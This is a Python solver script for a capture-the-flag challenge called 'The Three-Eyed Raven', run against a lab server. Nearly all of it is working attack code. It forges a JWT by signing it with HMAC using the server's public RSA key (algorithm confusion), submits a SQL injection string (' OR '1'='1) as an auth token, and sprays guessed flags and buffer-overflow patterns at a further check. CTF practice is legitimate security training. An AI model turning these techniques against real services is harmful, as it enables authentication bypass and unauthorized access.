#!/usr/bin/env python3
"""
The Three-Eyed Raven - Same Connection Solution
Create Face JWT using public key from the same connection
"""

import socket
import time
import base64
import json
import hmac
import hashlib

def connect_to_raven():
    """Connect to The Three-Eyed Raven service"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect(("labs.cyberspacevr.in", 30116))
    time.sleep(0.5)
    s.recv(4096)  # Skip banner
    return s

def test_same_connection_solution():
    """Test solution using same connection for all operations"""
    print("[+] Testing same connection solution...")
    
    try:
        s = connect_to_raven()
        
        # Step 1: Get public key from guest command
        print("[+] Step 1: Getting public key...")
        s.sendall(b"guest\n")
        time.sleep(0.5)
        guest_response = s.recv(4096).decode('utf-8', errors='ignore')
        
        # Extract public key
        if "-----BEGIN PUBLIC KEY-----" not in guest_response:
            print("[-] No public key found")
            s.close()
            return False
        
        start = guest_response.index("-----BEGIN PUBLIC KEY-----")
        end = guest_response.index("-----END PUBLIC KEY-----") + len("-----END PUBLIC KEY-----")
        public_key = guest_response[start:end]
        
        print(f"[+] Got public key from same connection")
        
        # Step 2: Create Face JWT using this public key
        print("[+] Step 2: Creating Face JWT...")
        key = (public_key + '\n').encode()
        
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {"name": "many-faced", "iat": int(time.time())}
        
        h = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b'=')
        
        p = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).rstrip(b'=')
        
        signing_input = h + b'.' + p
        sig = hmac.new(key, signing_input, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=')
        
        face_jwt = (signing_input + b'.' + sig_b64).decode()
        
        # Step 3: Offer iron token
        print("[+] Step 3: Offering iron token...")
        iron_token = "' OR '1'='1"
        s.sendall(f"offer iron {iron_token}\n".encode())
        time.sleep(1)
        iron_response = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"Iron: {iron_response.strip()}")
        
        if "accepted" not in iron_response.lower():
            print("[-] Iron token failed")
            s.close()
            return False
        
        # Step 4: Offer face JWT
        print("[+] Step 4: Offering face JWT...")
        s.sendall(f"offer face {face_jwt}\n".encode())
        time.sleep(1)
        face_response = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"Face: {face_response.strip()}")
        
        if "accepted" not in face_response.lower():
            print("[-] Face JWT failed")
            s.close()
            return False
        
        # Step 5: Check status
        print("[+] Step 5: Checking status after iron+face...")
        s.sendall(b"status\n")
        time.sleep(0.5)
        status = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"Status: {status}")
        
        # Step 6: Try dragon payloads
        print("[+] Step 6: Trying dragon payloads...")
        
        # Create comprehensive dragon payloads
        dragon_candidates = [
            # Flag-based
            "SpaceCTF{fire_and_blood_dracarys_complete}",
            "SpaceCTF{fire_and_blood_dracarys_victory}",
            "SpaceCTF{fire_and_blood_dracarys_throne}",
            "SpaceCTF{fire_and_blood_dracarys_dragon}",
            # Simple overflow
            "A" * 100,
            "A" * 256,
            "A" * 512,
            # Dragon-themed overflow
            "dracarys" + "A" * 100,
            "fire_and_blood_dracarys" + "A" * 100,
            # Specific patterns
            "A" * 88 + "BBBBBBBB",  # Common buffer overflow pattern
            "A" * 96 + "CCCCCCCC",
            # Dragon names
            "Drogon",
            "Rhaegal", 
            "Viserion",
            "Drogon Rhaegal Viserion",
            # Game of Thrones phrases
            "dracarys",
            "fire and blood",
            "Fire and Blood",
            "I am the blood of the dragon",
        ]
        
        for i, candidate in enumerate(dragon_candidates):
            print(f"[+] Testing dragon {i+1}/{len(dragon_candidates)}: {candidate[:30]}...")
            
            # Encode as base64
            b64_candidate = base64.b64encode(candidate.encode()).decode()
            
            s.sendall(f"offer dragon {b64_candidate}\n".encode())
            time.sleep(1)
            dragon_response = s.recv(4096).decode('utf-8', errors='ignore')
            
            # Check for success
            if "SpaceCTF{" in dragon_response:
                print(f"\n🎉 FLAG FOUND: {dragon_response}")
                s.close()
                return True
            
            if "accepted" in dragon_response.lower():
                print(f"[!] Dragon accepted: {dragon_response.strip()}")
                
                # Check final status
                s.sendall(b"status\n")
                time.sleep(0.5)
                final_status = s.recv(4096).decode('utf-8', errors='ignore')
                print(f"Final status: {final_status}")
                
                if "SpaceCTF{" in final_status:
                    print(f"\n🎉 FLAG FOUND: {final_status}")
                    s.close()
                    return True
                
                # Check if all three are accepted
                if ("iron   : accepted" in final_status and 
                    "face   : accepted" in final_status and 
                    "dragon : accepted" in final_status):
                    
                    print("[!] ALL THREE OFFERINGS ACCEPTED!")
                    
                    # Try to get the flag
                    for cmd in ["", "help", "quit"]:
                        s.sendall(f"{cmd}\n".encode())
                        time.sleep(0.5)
                        cmd_response = s.recv(4096).decode('utf-8', errors='ignore')
                        
                        if "SpaceCTF{" in cmd_response:
                            print(f"\n🎉 FLAG FOUND: {cmd_response}")
                            s.close()
                            return True
                    
                    print("[!] All offerings accepted but no flag found yet")
                    s.close()
                    return True
            
            elif "turns away" not in dragon_response and dragon_response.strip():
                print(f"[!] Unusual dragon response: {dragon_response.strip()}")
        
        s.close()
        
    except Exception as e:
        print(f"Error in same connection test: {e}")
    
    return False

def main():
    print("="*70)
    print("THE THREE-EYED RAVEN - SAME CONNECTION SOLUTION")
    print("="*70)
    
    if test_same_connection_solution():
        print("\n🎉 The Three-Eyed Raven challenge completed!")
    else:
        print("\n❌ Challenge not completed")

if __name__ == "__main__":
    main()